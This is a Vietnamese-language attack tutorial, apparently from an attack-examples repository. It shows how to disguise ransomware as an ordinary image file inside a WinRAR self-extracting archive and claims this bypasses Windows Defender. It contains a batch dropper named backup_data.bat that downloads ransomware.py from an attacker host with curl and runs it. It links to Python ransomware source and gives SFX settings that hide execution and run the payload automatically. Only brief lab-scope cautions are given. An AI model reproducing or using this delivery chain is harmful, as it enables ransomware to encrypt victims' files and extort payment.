# Giả mạo file bất kỳ để chạy ransomware
Lạm dụng tính năng hợp pháp của phần mềm WinRAR để nén trực tiếp ransomware và một file ảnh bất kỳ vào cùng 1 file, để tạo ra một file hoàn toàn hợp pháp, nhằm bypass hoàn toàn Windows Defender (trước khi nén, ransomware cũng đã được mã hóa). 

File được nén có tên và icon giống hệt 1 file ảnh bình thường.          
***(Ví dụ: Mô-hình-mạng-doanh-nghiệp.jpg, file ảnh này được đặt trong tệp file nén: Hồ-sơ-năng-lực-doanh-nghiệp.rar)***

Khi chạy file hợp pháp đã được nén đó, ransomware sẽ tự động thực thi và mã hóa toàn bộ dữ liệu file trên máy của nạn nhân (mã hóa ở đâu, 1 phần hay toàn bộ dữ liệu hoàn toàn do hacker quyết định,....). Thuật toán mã hóa được sử dụng là RSA-256 - key giải mã nằm duy nhất trên máy hacker.

Kết quả tấn công: Ransomware mã hóa toàn bộ file của nạn nhân và để lại thông tin liên lạc cho việc thanh toán tiền chuộc (có thể thành toán bằng bitcoin - tránh được sự giám sát từ bất kỳ một bên thứ 3 nào khác)

## Thực thi
1. [Ransomware được viết bằng python](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/Fake%20files%20to%20run%20ransomware/Windows.py)
2. ".bat" file có nhiệm vụ tải ransomware đang được host trên máy attacker về  và thực thi. Lưu ý: trong phạm vi thử nghiệm cần sửa lại file .bat này để ransomware được thực thi đúng vị trí thư mục thử nghiệm.
```bat
:: Tên file ".bat" đặt thành backup_data.bat
@echo

cd C:\\User\anoni\Desktop\backup 
:: cần sửa lại đúng đường dẫn của thư mục thử nghiệm. Thư mục thử nghiệm ở đây là **backup**

curl http://192.168.2.39:1113/ransomware.py > backup_data.py

backup_data.py
```

Con ransomware này sẽ mã hóa những file nằm trong cùng thư mục với nó. Vì thế nên trong phạm vi thử nghiệm, cần đặt nó đúng vào thư mục thử nghiệm!!! 

Key mã hóa (public key) đã được chèn thẳng vào code

Mã hóa file .bat trên tương tự như [demo này](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/Attach%20malicious%20code%20to%20a%20legitimate%20WORD%20file.md)

Trong demo này, file ảnh sẽ được giả mạo để thực thi ransomware 

1. Chọn file ảnh (.png) và file .bat đã mã hóa
2. Add to archive... -> Compression method: Best -> Create SFX archive
3. Advanced -> SFX options
4. "Path to extract: Điền thư mục thử nghiệm vào đây", Setup - Run after extraction: backup_data.bat, Text and icon: tự đặt, Modes: Hide all


